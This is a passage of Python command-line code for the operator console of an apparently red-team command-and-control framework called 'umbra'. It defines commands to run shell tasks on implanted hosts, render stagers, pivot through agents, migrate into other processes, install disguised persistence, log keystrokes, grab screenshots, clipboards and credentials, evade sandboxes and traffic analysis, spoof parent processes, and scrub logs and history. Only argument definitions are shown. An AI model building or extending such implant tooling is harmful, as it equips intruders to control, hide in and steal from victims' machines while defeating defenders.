    baseline_add.add_argument("--agent", required=True, help="the host")
    baseline_add.add_argument("path", help="the path")
    baseline_add.add_argument("--label", default="",
                              help="what the path is, in the words of the team")
    baseline_add.add_argument("--note", default="")
    baseline_add.add_argument("--json", action="store_true")

    baseline_remove = baseline_sub.add_parser("remove",
                                               help="stop watching a path")
    baseline_remove.add_argument("id")
    baseline_remove.add_argument("--json", action="store_true")

    baseline_check = baseline_sub.add_parser("check",
                                              help="look at the watched paths")
    baseline_check.add_argument("--agent", default="", help="the host")
    baseline_check.add_argument("--wait", action="store_true",
                                help="wait for and print the answer")
    baseline_check.add_argument("--json", action="store_true")

    # ---- the file of a host ---------------------------------------------
    dossier_cmd = sub.add_parser("dossier",
                                  help="the file of a host: what the server "
                                       "knows and what it did")
    dossier_sub = dossier_cmd.add_subparsers(dest="dossier_cmd")

    dossier_list = dossier_sub.add_parser("list",
                                           help="every host, the weakest first")
    dossier_list.add_argument("--json", action="store_true")

    dossier_show = dossier_sub.add_parser("show", help="the file of one host")
    dossier_show.add_argument("agent")
    dossier_show.add_argument("--json", action="store_true")

    note_cmd = sub.add_parser("note", help="the notes the team writes about hosts")
    note_sub = note_cmd.add_subparsers(dest="note_cmd")

    note_list = note_sub.add_parser("list", help="the notes of one host or of the team")
    note_list.add_argument("--agent", default="", help="one host")
    note_list.add_argument("--json", action="store_true")

    note_add = note_sub.add_parser("add", help="write a note about a host")
    note_add.add_argument("--agent", required=True, help="the host")
    note_add.add_argument("text")
    note_add.add_argument("--json", action="store_true")

    note_show = note_sub.add_parser("show", help="one note by id")
    note_show.add_argument("id")
    note_show.add_argument("--json", action="store_true")

    note_remove = note_sub.add_parser("remove", help="take a note away")
    note_remove.add_argument("id")
    note_remove.add_argument("--json", action="store_true")

    # ---- the wires to the outside world ----------------------------------
    hook_cmd = sub.add_parser(
        "hook",
        help="the wires to the outside world: URLs the events are posted to")
    hook_sub = hook_cmd.add_subparsers(dest="hook_cmd")

    hook_list = hook_sub.add_parser("list", help="the wires of the team")
    hook_list.add_argument("--json", action="store_true")

    hook_add = hook_sub.add_parser("add", help="write a wire down")
    hook_add.add_argument("url", help="where the posts go (http or https)")
    hook_add.add_argument(
        "--kinds", default="",
        help="the event kinds the wire carries, comma separated; a name "
             "ending in a star matches a beginning, the empty list is all")
    hook_add.add_argument("--secret", default="",
                          help="the word the posts are signed with (HMAC-SHA256)")
    hook_add.add_argument("--json", action="store_true")

    hook_remove = hook_sub.add_parser("remove", help="forget a wire")
    hook_remove.add_argument("id")
    hook_remove.add_argument("--json", action="store_true")

    hook_test = hook_sub.add_parser(
        "test", help="ring a wire once, marked as a test")
    hook_test.add_argument("id")
    hook_test.add_argument("--json", action="store_true")

    # ---- the wall of the techniques --------------------------------------
    attack_cmd = sub.add_parser(
        "attack",
        help="the wall of the ATT&CK techniques the team uses")
    attack_cmd.add_argument("--agent", default="", help="one host")
    attack_cmd.add_argument("--all", action="store_true",
                            help="also the techniques nobody used")
    attack_cmd.add_argument("--json", action="store_true")

    # ---- the digging box -------------------------------------------------
    search_cmd = sub.add_parser(
        "search",
        help="dig one needle through the tasks, the notes and the creds")
    search_cmd.add_argument("words", nargs="+", help="the needle")
    search_cmd.add_argument("--scope", default="all",
                            choices=["all", "tasks", "notes", "creds"])
    search_cmd.add_argument("--agent", default="", help="one host")
    search_cmd.add_argument("--limit", type=int, default=25)
    search_cmd.add_argument("--json", action="store_true")

    # ---- the second factor of the operator ------------------------------
    otp_cmd = sub.add_parser("otp", help="the second factor of the operator")
    otp_sub = otp_cmd.add_subparsers(dest="otp_cmd")

    otp_status = otp_sub.add_parser("status", help="who has a second factor")
    otp_status.add_argument("--json", action="store_true")

    otp_rotate = otp_sub.add_parser("rotate", help="make a new secret")
    otp_rotate.add_argument("--operator", default="",
                            help="the operator (default: yourself)")
    otp_rotate.add_argument("--issuer", default="",
                            help="the name of the team the phone shows")
    otp_rotate.add_argument("--json", action="store_true")

    otp_remove = otp_sub.add_parser("remove",
                                    help="take the second factor away")
    otp_remove.add_argument("--operator", default="",
                            help="the operator (default: yourself)")
    otp_remove.add_argument("--json", action="store_true")

    otp_code = otp_sub.add_parser("code",
                                  help="the code of the moment for a secret "
                                       "(for a lab, not for the phone)")
    otp_code.add_argument("--secret", required=True, help="the base32 secret")
    otp_code.add_argument("--json", action="store_true")

    info = sub.add_parser("info", help="show one agent")
    info.add_argument("agent")

    run = sub.add_parser("run", help="queue a shell command, or one task on many agents")
    run.add_argument("agent", nargs="?", default="")
    run.add_argument("command", nargs=argparse.REMAINDER)
    run.add_argument("--wait", action="store_true", help="wait for and print the result")
    run.add_argument("--timeout", type=float, default=120.0)
    run.add_argument("--kind", dest="kind_flag", default="",
                     help="the task kind of a bulk run")
    run.add_argument("--args", default="{}", help="the task arguments as JSON (bulk run)")
    run.add_argument("--group", default="",
                     help="the tag of the agents of a bulk run")
    run.add_argument("--agents", default="",
                     help="comma separated agent ids of a bulk run")
    run.add_argument("--filter", default="",
                     help="the filter of a bulk run: state=online,os=windows")
    run.add_argument("--cap", type=int, default=4,
                     help="how many answers are waited for at the same time (bulk run)")

    # -- the raw command line ---------------------------------------------
    rpc = sub.add_parser("rpc", help="send one raw command to the server")
    rpc.add_argument("command")
    rpc.add_argument("args", nargs="?", default="",
                     help="the arguments of the command as JSON")
    rpc.add_argument("--arg", action="append", default=[],
                     help="one argument as key=value, repeatable")

    # -- the plan ----------------------------------------------------------
    batch = sub.add_parser("batch", help="run a plan file, step by step")
    batch.add_argument("--file", required=True, help="the plan file")
    batch.add_argument("--param", action="append", default=[],
                       help="one parameter of the plan as key=value, repeatable")
    batch.add_argument("--no-wait", action="store_true",
                       help="queue the steps without waiting for the answers")
    batch.add_argument("--timeout", type=float, default=120.0)

    # -- the workflow layer ------------------------------------------------
    workflow = sub.add_parser("workflow", help="the named sequences of steps")
    workflow.add_argument("action", choices=["list", "add", "rm", "run", "status"])
    workflow.add_argument("name", nargs="?", default="")
    workflow.add_argument("--file", default="", help="the plan file (add)")
    workflow.add_argument("--description", default="", help="one line about it (add)")
    workflow.add_argument("--param", action="append", default=[],
                          help="one parameter as key=value (run), repeatable")
    workflow.add_argument("--wait", action="store_true",
                          help="wait for the run to finish (run)")
    workflow.add_argument("--timeout", type=float, default=300.0)

    task = sub.add_parser("task", help="queue an arbitrary task")
    task.add_argument("agent", nargs="?", default="", help="agent id")
    task.add_argument("kind", nargs="?", default="", help="task kind")
    task.add_argument("--kind", dest="kind_flag", default="",
                      help="task kind (use this with --agents, where there is no single agent)")
    task.add_argument("--args", default="{}", help="task arguments as JSON")
    task.add_argument("--wait", action="store_true")
    task.add_argument("--timeout", type=float, default=120.0)
    task.add_argument("--deadline", default="",
                      help="when the task stops being worth running "
                           "(RFC 3339 or a unix timestamp)")
    task.add_argument("--task-timeout", type=int, default=0,
                      help="how long the task may run, in seconds")
    task.add_argument("--agents", default="",
                      help="comma separated agent ids: queue the task on all of them")
    task.add_argument("--filter", default="",
                      help="filter that selects the agents: state=online,tag=dc")

    down = sub.add_parser("download", help="pull a file from an agent (chunked)")
    down.add_argument("agent")
    down.add_argument("remote", help="path on the agent")
    down.add_argument("local", help="destination path on this host")
    down.add_argument("--chunk", type=int, default=0, help="bytes per request (max 900 KiB)")
    down.add_argument("--timeout", type=float, default=120.0, help="per-chunk timeout")

    up = sub.add_parser("upload", help="push a file to an agent (chunked)")
    up.add_argument("agent")
    up.add_argument("local", help="source path on this host")
    up.add_argument("remote", help="destination path on the agent")
    up.add_argument("--chunk", type=int, default=0, help="bytes per request (max 900 KiB)")
    up.add_argument("--timeout", type=float, default=120.0, help="per-chunk timeout")

    tasks = sub.add_parser("tasks", help="list tasks")
    tasks.add_argument("agent", nargs="?", default="", help="agent id (omit for every agent)")
    tasks.add_argument("--limit", type=int, default=20)
    tasks.add_argument("--kind", default="", help="filter: the task kind")
    tasks.add_argument("--state", default="", help="filter: queued, delivered, done, failed")
    tasks.add_argument("--trace", default="", help="filter: the trace id of the task")

    result = sub.add_parser("result", help="print a task result")
    result.add_argument("task_id")
    result.add_argument("--out", default="", help="write the output to this file")

    cancel = sub.add_parser("cancel", help="cancel a queued task")
    retry = sub.add_parser("retry", help="run a finished task again")
    retry.add_argument("task_id")
    cancel.add_argument("task_id")

    watch = sub.add_parser("watch", help="stream events until interrupted")
    wipe = sub.add_parser("wipe", help="clear the record of the engagement")
    wipe.add_argument("--yes", action="store_true", help="do not ask")

    # -- the zero-footprint wipe ------------------------------------------
    # The wipe of a host is not a task like any other: it ends an
    # engagement, so it has its own commands and it asks before it
    # destroys anything.
    survey = sub.add_parser("survey", help="what the engagement left on a host")
    survey.add_argument("agent")
    survey.add_argument("--wait", action="store_true")
    survey.add_argument("--timeout", type=float, default=120.0)

    forensics = sub.add_parser("forensics",
                               help="the surface of a host, as an analyst sees it")
    forensics.add_argument("agent")
    forensics.add_argument("--wait", action="store_true")
    forensics.add_argument("--timeout", type=float, default=120.0)

    scrub = sub.add_parser("scrub", help="remove the traces of a host")
    scrub.add_argument("agent")
    scrub.add_argument("--what", default="",
                       help="the families to touch: state, history, recent, "
                            "cache, log, system or all")
    scrub.add_argument("--dry-run", action="store_true",
                       help="look without touching anything")
    scrub.add_argument("--wait", action="store_true")
    scrub.add_argument("--timeout", type=float, default=180.0)

    verify = sub.add_parser("verify", help="what is left on a host after the wipe")
    verify.add_argument("agent")
    verify.add_argument("--wait", action="store_true")
    verify.add_argument("--timeout", type=float, default=120.0)

    journal = sub.add_parser("journal", help="the timeline of the engagement on a host")
    journal.add_argument("agent")
    journal.add_argument("--on", action="store_true", help="turn the journal on")
    journal.add_argument("--off", action="store_true", help="turn the journal off")
    journal.add_argument("--wait", action="store_true")
    journal.add_argument("--timeout", type=float, default=120.0)

    vanish = sub.add_parser("vanish", help="the implant leaves the host")
    vanish.add_argument("agent")
    vanish.add_argument("--yes", action="store_true", help="do not ask")
    vanish.add_argument("--wait", action="store_true")
    vanish.add_argument("--timeout", type=float, default=180.0)

    decommission = sub.add_parser("decommission",
                                  help="the end of the engagement on a host")
    decommission.add_argument("agent")
    decommission.add_argument("--yes", action="store_true", help="do not ask")
    decommission.add_argument("--wait", action="store_true")
    decommission.add_argument("--timeout", type=float, default=180.0)

    clean = sub.add_parser("clean",
                            help="the traces of the engagement on this machine")
    clean.add_argument("--history", action="store_true",
                       help="take the lines of the console out of the history "
                            "of the shell")
    clean.add_argument("--notebook", action="store_true",
                       help="remove the notebook and the files of the console")
    clean.add_argument("--dry-run", action="store_true",
                       help="say what would go, touch nothing")
    clean.add_argument("--yes", action="store_true", help="do not ask")

    deadman = sub.add_parser("deadman",
                             help="the dead man's switch of a host")
    deadman.add_argument("agent")
    deadman.add_argument("--minutes", type=int, default=0,
                         help="the minutes of silence after which the implant "
                              "ends itself; zero disarms the switch")
    deadman.add_argument("--wait", action="store_true")
    deadman.add_argument("--timeout", type=float, default=120.0)

    cleanup = sub.add_parser("cleanup",
                             help="the end of an engagement on many hosts")
    cleanup.add_argument("--filter", default="state=online",
                         help="the hosts to clean: state=online, tag=dc, ...")
    cleanup.add_argument("--what", default="state,history,cache",
                         help="the families to touch: state, history, recent, "
                              "cache, log, system or all")
    cleanup.add_argument("--yes", action="store_true", help="do not ask")
    cleanup.add_argument("--timeout", type=float, default=180.0)
    sessions_cmd = sub.add_parser("sessions", help="the interactive sessions that are open")
    events_cmd = sub.add_parser("events", help="the recent events of the server's journal")
    events_cmd.add_argument("--limit", type=int, default=50)
    events_cmd.add_argument("--after", type=int, default=0)
    events_cmd.add_argument("--kind", default="")
    events_cmd.add_argument("--agent", default="", help="only the events of one agent")
    watch.add_argument("--limit", type=int, default=0, help="stop after N events (0 = forever)")

    sleep = sub.add_parser("sleep", help="change beacon interval")
    sleep.add_argument("agent")
    sleep.add_argument("seconds", type=int)
    sleep.add_argument("--jitter", type=int, default=20)

    kill = sub.add_parser("kill", help="tell an agent to exit")
    kill.add_argument("agent")

    # -- pivoting -------------------------------------------------------
    pivot = sub.add_parser("pivot", help="pivot through an agent (socks5 / port forward)")
    pivot.add_argument("action", choices=["list", "open", "close", "claims", "release"],
                       help="list the pivots, open one, close one, list the "
                            "claims or release one")
    pivot.add_argument("target", nargs="?", default="",
                       help="agent id (open), tunnel id (close) or claim (release)")
    pivot.add_argument("--mode", choices=["socks", "forward"], default="socks",
                       help="socks lets the client pick the target, forward fixes it")
    pivot.add_argument("--host", default="", help="remote host (forward mode)")
    pivot.add_argument("--port", type=int, default=0, help="remote port (forward mode)")
    pivot.add_argument("--listen", default="", help="local bind address (default 127.0.0.1:0)")
    pivot.add_argument("--dns", choices=["remote", "local"], default="remote",
                       help="who resolves the name of the target: the target "
                            "(remote) or the server (local)")
    pivot.add_argument("--loopback", action="store_true",
                       help="force the listener onto the loopback of the server")
    pivot.add_argument("--claim", default="",
                       help="name the pivot, so it can be released as a group")
    pivot.add_argument("--through", action="append", default=[],
                       help="the agent this pivot is chained through; repeat it "
                            "to chain the pivot through several agents")
    pivot.add_argument("--user", default="",
                       help="the user the socks5 proxy asks for")
    pivot.add_argument("--pipe", action="store_true",
                        help="listen on a named pipe (Windows servers only)")
    pivot.add_argument("--pipe-name", default="",
                        help="the name of the named pipe (default umbra-<tunnel>)")
    pivot.add_argument("--password", default="",
                       help="the password the socks5 proxy asks for")

    # -- the route of an agent -------------------------------------------
    transport = sub.add_parser(
        "transport",
        help="the route of an agent: which transport it speaks, in which "
             "order it may fall back",
    )
    transport.add_argument("action", choices=["set", "get", "list"],
                           help="set the route of an agent, read one or list them all")
    transport.add_argument("target", nargs="?", default="",
                           help="agent id (set and get)")
    transport.add_argument("--primary", default="",
                           help="the transport the agent speaks first: tcp, http, dns or ws")
    transport.add_argument("--fallback", default="",
                           help="the order the agent may fall back in, comma separated")
    transport.add_argument("--front", default="",
                           help="the domain the agent puts in the Host header")
    transport.add_argument("--inspect", action="store_true",
                           help="the proxy in front of the agent reads the traffic")
    transport.add_argument("--http-path", default="",
                           help="the route of the HTTP transport")
    transport.add_argument("--ws-path", default="",
                           help="the route of the WebSocket transport")

    # -- layer-3 tunnel --------------------------------------------------
    vpn = sub.add_parser("vpn", help="the layer-3 tunnel between the implants and the server")
    vpn.add_argument("action", choices=["status", "peers", "allocate", "routes",
                                        "route", "ping"])
    vpn.add_argument("target", nargs="?", default="", help="agent id (allocate)")
    vpn.add_argument("network", nargs="?", default="", help="the network of the route")

    # -- extension store -------------------------------------------------
    armory = sub.add_parser("armory", help="the extension store")
    armory.add_argument("action", choices=["list", "search", "needs", "versions",
                                           "resolve", "import", "install", "remove", "run"])
    armory.add_argument("name", nargs="?", default="", help="extension name")
    armory.add_argument("agent", nargs="?", default="", help="agent id (run)")
    armory.add_argument("--args", default="{}", help="task arguments as JSON (run)")
    armory.add_argument("--url", default="", help="the url of a remote catalogue (import)")

    # -- command namespace ------------------------------------------------
    alias = sub.add_parser("alias", help="saved commands")
    alias.add_argument("action", choices=["list", "run", "add", "rm"])
    alias.add_argument("name", nargs="?", default="", help="alias name")
    alias.add_argument("agent", nargs="?", default="", help="agent id (run)")
    alias.add_argument("--args", default="{}", help="task arguments as JSON (run)")
    alias.add_argument("--arg", action="append", default=[],
                       help="one argument as key=value (run), repeatable")
    alias.add_argument("--kind", default="", help="the task kind of the alias (add)")
    alias.add_argument("--extension", default="", help="the module of the alias (add)")
    alias.add_argument("--description", default="", help="one line about the alias (add)")
    alias.add_argument("--spec", default="",
                       help="the parameters the alias takes, comma separated (add)")

    sub.add_parser("team-sync", help="one snapshot of the team (agents, operators, chat)")

    # -- process migration -------------------------------------------------
    migrate = sub.add_parser("migrate",
                             help="move the work of an agent into another process")
    migrate.add_argument("agent")
    migrate.add_argument("--pid", type=int, default=0,
                         help="the process that is taken over")
    migrate.add_argument("--spawn", default="",
                         help="the program the agent starts itself")
    migrate.add_argument("--out", action="store_true",
                         help="the agent leaves its own process")
    migrate.add_argument("--resume", action="store_true",
                         help="the original program of the target keeps running")
    migrate.add_argument("--args", default="{}",
                         help="task arguments as JSON (the payload lives here)")
    migrate.add_argument("--wait", action="store_true")
    migrate.add_argument("--timeout", type=float, default=120.0)

    # -- reconnaissance ----------------------------------------------------
    recon = sub.add_parser("recon", help="run a reconnaissance profile on an agent")
    recon.add_argument("agent")
    recon.add_argument("--profile", default="host",
                       help="host, windows, linux, cloud, container or all")
    recon.add_argument("--checks", default="",
                       help="the checks to run, comma separated (wins over the profile)")
    recon.add_argument("--wait", action="store_true")
    recon.add_argument("--timeout", type=float, default=120.0)

    domain_map = sub.add_parser("domain-map",
                                help="the paths from the identity of an agent to a target")
    domain_map.add_argument("agent")
    domain_map.add_argument("--target", default="",
                            help="the node of the graph to reach (the controller by default)")
    domain_map.add_argument("--wait", action="store_true")
    domain_map.add_argument("--timeout", type=float, default=120.0)

    suggest = sub.add_parser("suggest",
                             help="what could be tried next, given the findings")
    suggest.add_argument("agent")
    suggest.add_argument("--profile", default="host",
                         help="the profile the findings come from")
    suggest.add_argument("--wait", action="store_true")
    suggest.add_argument("--timeout", type=float, default=120.0)

    # -- stagers ----------------------------------------------------------
    stager = sub.add_parser("stager", help="render a stager script")
    stager.add_argument("--platform", default="windows", choices=["windows", "linux", "macos"])
    stager.add_argument("--transport", default="tcp",
                        choices=["tcp", "http", "ws", "dns", "smtp", "s3"])
    stager.add_argument("--server", default="", help="agent listener (host:port)")
    stager.add_argument("--url", default="", help="url the stager downloads from")
    stager.add_argument("--sha256", default="", help="sha256 of the payload the stager fetches")
    stager.add_argument("--agent-id", default="", help="agent id to bake into the stager")
    stager.add_argument("--mode", default="download",
                        choices=["download", "store", "offline", "shim"],
                        help="download, store (the file store of the server), "
                             "offline (the beacon travels inside) or shim (the digest check)")
    stager.add_argument("--store", default="", help="name of the beacon in the file store")
    stager.add_argument("--store-base", default="", help="base url of the server that holds the store")
    stager.add_argument("--dns-domain", default="", help="the domain the dns tunnel answers for")
    stager.add_argument("--dns-resolver", default="", help="the resolver of the dns tunnel")
    stager.add_argument("--smtp-addr", default="", help="the smtp server of the mail transport")
    stager.add_argument("--pop3-addr", default="", help="the pop3 server of the mail transport")
    stager.add_argument("--s3-endpoint", default="", help="the endpoint of the object store")
    stager.add_argument("--s3-region", default="", help="the region of the object store")
    stager.add_argument("--payload", default="", help="path of the beacon for the offline stager")

    # -- interactive sessions ---------------------------------------------
    session = sub.add_parser("session", help="open an interactive session on an agent")
    session.add_argument("agent")
    session.add_argument("--cmd", dest="shell_cmd", default="",
                         help="the command to run (empty starts the platform shell)")
    session.add_argument("--input", dest="input_text", default="",
                         help="write one line and wait for the result")
    session.add_argument("--timeout", type=float, default=300.0)

    # -- multi-stage tasks -------------------------------------------------
    chain = sub.add_parser("chain", help="queue a multi-stage task")
    chain.add_argument("agent")
    chain.add_argument("--stages", default="[]",
                       help='the stages as JSON: [{"kind":"shell","args":{"cmd":"id"}}]')
    chain.add_argument("--wait", action="store_true")
    chain.add_argument("--timeout", type=float, default=300.0)

    # -- alerts ------------------------------------------------------------
    alerts = sub.add_parser("alerts", help="the alert rules of the server")

    # -- installing and updating ------------------------------------------
    persist = sub.add_parser("persist", help="install the implant so it survives a reboot")
    persist.add_argument("agent")
    persist.add_argument("--method", default="auto",
                         help="auto, or a technique id (registry.run, systemd.user, ...)")
    persist.add_argument("--name", default="",
                         help="the label of the entry (it should look ordinary)")
    persist.add_argument("--silent", dest="silent", action="store_true", default=True,
                         help="do not repeat the output of the platform tool (the default)")
    persist.add_argument("--verbose", dest="silent", action="store_false",
                         help="show what the platform tool said")
    persist.add_argument("--no-verify", dest="verify", action="store_false", default=True,
                         help="do not read the entry back after installing it")
    persist.add_argument("--wait", action="store_true")
    persist.add_argument("--timeout", type=float, default=120.0)

    unpersist = sub.add_parser("unpersist", help="remove the start-up entries of the implant")
    unpersist.add_argument("agent")
    unpersist.add_argument("--method", default="all",
                           help="all, or the technique to remove")
    unpersist.add_argument("--wait", action="store_true")
    unpersist.add_argument("--timeout", type=float, default=120.0)

    creds_list = sub.add_parser("creds-list",
                                help="the credential vault of the engagement")
    creds_list.add_argument("--agent", default="", help="only this host")
    creds_list.add_argument("--kind", default="", help="password, hash, ticket, token, key")
    creds_list.add_argument("--query", default="", help="search the account, the target and the note")

    creds_search = sub.add_parser("creds-search",
                                  help="search the credential vault")
    creds_search.add_argument("query")
    creds_search.add_argument("--kind", default="")
    creds_search.add_argument("--agent", default="")

    creds_export = sub.add_parser("creds-export",
                                  help="the material with its value (operator role)")
    creds_export.add_argument("--agent", default="")
    creds_export.add_argument("--kind", default="")
    creds_export.add_argument("--query", default="")

    creds_reuse = sub.add_parser(
        "creds-reuse",
        help="the secrets that serve on more than one host")
    creds_reuse.add_argument("--json", action="store_true")

    rhythm_cmd = sub.add_parser(
        "rhythm",
        help="how the beacons breathe: the shape of the check-ins")
    rhythm_cmd.add_argument("agent", nargs="?", default="",
                            help="one host; without one, the fleet")
    rhythm_cmd.add_argument("--json", action="store_true")

    silence_cmd = sub.add_parser(
        "silence",
        help="the watches of the silences: the news of nothing")
    silence_sub = silence_cmd.add_subparsers(dest="silence_cmd")

    silence_list = silence_sub.add_parser("list", help="the watches")
    silence_list.add_argument("--json", action="store_true")

    silence_add = silence_sub.add_parser(
        "add", help="promise to worry about a quiet host")
    silence_add.add_argument("agent")
    silence_add.add_argument("--seconds", type=int, required=True,
                             help="the pause that becomes news (5..604800)")
    silence_add.add_argument("--cooldown", type=int, default=0,
                             help="how long a fired watch holds its peace")
    silence_add.add_argument("--json", action="store_true")

    silence_remove = silence_sub.add_parser("remove", help="forget a watch")
    silence_remove.add_argument("id")
    silence_remove.add_argument("--json", action="store_true")

    persist_list = sub.add_parser("persist-list",
                                  help="what is installed on an agent")
    persist_list.add_argument("agent")
    persist_list.add_argument("--wait", action="store_true")
    persist_list.add_argument("--timeout", type=float, default=120.0)

    persist_verify = sub.add_parser("persist-verify",
                                    help="check that the entries are still there")
    persist_verify.add_argument("agent")
    persist_verify.add_argument("--wait", action="store_true")
    persist_verify.add_argument("--timeout", type=float, default=120.0)

    persist_migrate = sub.add_parser("persist-migrate",
                                     help="move from one technique to another")
    persist_migrate.add_argument("agent")
    persist_migrate.add_argument("--from", dest="source", required=True)
    persist_migrate.add_argument("--to", dest="target", required=True)
    persist_migrate.add_argument("--wait", action="store_true")
    persist_migrate.add_argument("--timeout", type=float, default=120.0)

    persist_health = sub.add_parser("persist-health",
                                     help="the persistence verdict of an agent")
    persist_health.add_argument("agent")
    persist_health.add_argument("--wait", action="store_true")
    persist_health.add_argument("--timeout", type=float, default=120.0)

    persist_report = sub.add_parser("persist-report",
                                     help="the persistence of the whole fleet")
    persist_report.add_argument("--agent", default="", help="only this agent")
    persist_report.add_argument("--json", action="store_true")

    evade_report = sub.add_parser("evade-report",
                                   help="the posture of an agent or of the fleet")
    evade_report.add_argument("agent", nargs="?", default="")
    evade_report.add_argument("--wait", action="store_true")
    evade_report.add_argument("--timeout", type=float, default=120.0)
    evade_report.add_argument("--json", action="store_true")

    evade_posture = sub.add_parser(
        "evade-posture", help="how the environment changes the behaviour of the implant")
    evade_posture.add_argument("agent")
    evade_posture.add_argument("--silence", dest="silence", action="store_true", default=None,
                               help="the implant stops answering in a sandbox")
    evade_posture.add_argument("--no-silence", dest="silence", action="store_false")
    evade_posture.add_argument("--slow", dest="slow", action="store_true", default=None,
                               help="the implant slows down in a sandbox")
    evade_posture.add_argument("--no-slow", dest="slow", action="store_false")
    evade_posture.add_argument("--virtual-factor", type=int, default=0,
                               help="the factor a virtual host stretches the sleep with")
    evade_posture.add_argument("--sandbox-factor", type=int, default=0,
                               help="the factor a sandbox stretches the sleep with")
    evade_posture.add_argument("--lab-factor", type=int, default=0)
    evade_posture.add_argument("--developer-factor", type=int, default=0)
    evade_posture.add_argument("--jitter-bonus", type=int, default=0)
    evade_posture.add_argument("--wait", action="store_true")
    evade_posture.add_argument("--timeout", type=float, default=120.0)
    evade_posture.add_argument("--json", action="store_true")

    evade_profile = sub.add_parser("evade-profile", help="the schedule the beacon sleeps by")
    evade_profile.add_argument("agent")
    evade_profile.add_argument("--base", type=int, default=0, help="the base interval")
    evade_profile.add_argument("--busy-start", type=int, default=0, help="the first working hour")
    evade_profile.add_argument("--busy-end", type=int, default=0, help="the last working hour")
    evade_profile.add_argument("--busy-factor", type=int, default=0)
    evade_profile.add_argument("--night-factor", type=int, default=0)
    evade_profile.add_argument("--weekend-factor", type=int, default=0)
    evade_profile.add_argument("--wait", action="store_true")
    evade_profile.add_argument("--timeout", type=float, default=120.0)
    evade_profile.add_argument("--json", action="store_true")

    evade_shape = sub.add_parser("evade-shape", help="the shape of the traffic")
    evade_shape.add_argument("agent")
    evade_shape.add_argument("--mode", default="", help="off, random or fixed")
    evade_shape.add_argument("--size", type=int, default=0, help="the size of the frames")
    evade_shape.add_argument("--pad-every", type=int, default=0)
    evade_shape.add_argument("--reorder", dest="reorder", action="store_true", default=None,
                             help="shuffle the tasks inside a cycle")
    evade_shape.add_argument("--no-reorder", dest="reorder", action="store_false")
    evade_shape.add_argument("--wait", action="store_true")
    evade_shape.add_argument("--timeout", type=float, default=120.0)
    evade_shape.add_argument("--json", action="store_true")

    evade_kill = sub.add_parser("evade-killswitch",
                                help="the moment the implant stops existing")
    evade_kill.add_argument("agent")
    evade_kill.add_argument("--file", default="", help="the implant stops when this file appears")
    evade_kill.add_argument("--registry", default="", help="HKLM\\KEY\\VALUE")
    evade_kill.add_argument("--at", type=int, default=0, help="a unix timestamp")
    evade_kill.add_argument("--uptime", type=int, default=0, help="hours of uptime")
    evade_kill.add_argument("--marker", default="", help="the operator sends this marker")
    evade_kill.add_argument("--note", default="")
    evade_kill.add_argument("--clear", action="store_true")
    evade_kill.add_argument("--wait", action="store_true")
    evade_kill.add_argument("--timeout", type=float, default=120.0)
    evade_kill.add_argument("--json", action="store_true")

    hygiene = sub.add_parser("hygiene", help="the memory and the process hygiene")
    hygiene.add_argument("agent")
    hygiene.add_argument("--memory", action="store_true", help="the memory report")
    hygiene.add_argument("--copy", default="", help="copy the implant to this path")
    hygiene.add_argument("--name", default="", help="the name the process reports")
    hygiene.add_argument("--cwd", default="", help="the working directory of the process")
    hygiene.add_argument("--clean-env", action="store_true",
                         help="remove the tool from the environment")
    hygiene.add_argument("--ppid", type=int, default=0,
                         help="the parent the process claims to have")
    hygiene.add_argument("--wait", action="store_true")
    hygiene.add_argument("--timeout", type=float, default=120.0)
    hygiene.add_argument("--json", action="store_true")

    update = sub.add_parser("update", help="replace the running implant")
    update.add_argument("agent")
    update.add_argument("path", help="the new binary on the target")
    update.add_argument("--sha256", default="", help="the expected digest of the new binary")
    update.add_argument("--wait", action="store_true")
    update.add_argument("--timeout", type=float, default=120.0)

    keylog_cmd = sub.add_parser("keylog-file", help="write the keys into a file on an agent")
    keylog_cmd.add_argument("agent")
    keylog_cmd.add_argument("path", nargs="?", default="umbra-keys.log")
    keylog_cmd.add_argument("--seconds", type=int, default=300)
    keylog_cmd.add_argument("--wait", action="store_true")
    keylog_cmd.add_argument("--timeout", type=float, default=120.0)

    tail_cmd = sub.add_parser("tail", help="the last lines of a file on an agent")
    tail_cmd.add_argument("agent")
    tail_cmd.add_argument("path")
    tail_cmd.add_argument("--lines", type=int, default=20)
    tail_cmd.add_argument("--wait", action="store_true")
    tail_cmd.add_argument("--timeout", type=float, default=120.0)

    hash_cmd = sub.add_parser("hash", help="the SHA-256 of a file on an agent")
    hash_cmd.add_argument("agent")
    hash_cmd.add_argument("path")
    hash_cmd.add_argument("--wait", action="store_true")
    hash_cmd.add_argument("--timeout", type=float, default=120.0)

    reg = sub.add_parser("registry", help="the Windows registry of an agent")
    reg.add_argument("agent")
    reg.add_argument("key", help="the key, for example SOFTWARE\\Microsoft")
    reg.add_argument("--hive", default="HKLM", help="HKLM, HKCU, HKCR or HKU")
    reg.add_argument("--value", default="", help="read one value instead of the whole key")
    reg.add_argument("--wait", action="store_true")
    reg.add_argument("--timeout", type=float, default=120.0)

    procs = sub.add_parser("proc", help="the process table of an agent")
    procs.add_argument("agent")
    procs.add_argument("--wait", action="store_true")
    procs.add_argument("--timeout", type=float, default=120.0)

    prockill = sub.add_parser("proc-kill", help="terminate a process on an agent")
    prockill.add_argument("agent")
    prockill.add_argument("target", help="the pid or the name of the process")
    prockill.add_argument("--wait", action="store_true")
    prockill.add_argument("--timeout", type=float, default=120.0)

    report = sub.add_parser("report", help="write a report about one agent")
    report.add_argument("agent", nargs="?", default="")
    report.add_argument("--all", action="store_true", help="the whole engagement")
    report.add_argument("--limit", type=int, default=50)
    report.add_argument("--out", default="", help="write the report to this file")

    browse = sub.add_parser("browse", help="list the files under a path on an agent")
    browse.add_argument("agent")
    browse.add_argument("path", nargs="?", default=".")
    browse.add_argument("--max", type=int, default=500)
    browse.add_argument("--wait", action="store_true")
    browse.add_argument("--timeout", type=float, default=300.0)

    # -- the operator's own desktop ---------------------------------------
    shot = sub.add_parser("screenshot", help="capture the screen of an agent")
    shot.add_argument("agent")
    shot.add_argument("file", nargs="?", default="", help="where to write the png")
    shot.add_argument("--timeout", type=float, default=120.0)

    clip = sub.add_parser("clipboard", help="read the clipboard of an agent")
    clip.add_argument("agent")
    clip.add_argument("--wait", action="store_true")
    clip.add_argument("--timeout", type=float, default=120.0)

    # -- the senses of the desktop ----------------------------------------
    # The eight families that only a workstation can answer.  The console
    # asks for them with the names of the protocol, and the operator reads
    # the truth of the machine.
    win = sub.add_parser("windows", help="list the windows of an agent")
    win.add_argument("agent")
    win.add_argument("--wait", action="store_true")
    win.add_argument("--timeout", type=float, default=120.0)

    clipw = sub.add_parser("clipboard-watch",
                            help="the watcher of the clipboard of an agent")
